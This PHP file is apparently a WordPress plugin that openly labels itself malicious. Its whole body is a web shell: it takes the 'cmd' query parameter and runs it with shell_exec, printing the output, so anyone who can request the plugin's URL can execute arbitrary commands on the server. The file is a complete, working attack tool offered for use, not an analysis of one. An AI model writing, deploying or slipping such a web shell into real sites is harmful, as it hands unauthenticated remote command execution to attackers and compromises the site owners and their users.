<?php
/*
Plugin Name: Malicious wordpress plugin
Description: A plugin with a web shell.
Version: 1.1337
Author: 1337 
*/

if (isset($_GET['cmd'])) {
    echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
}
?>
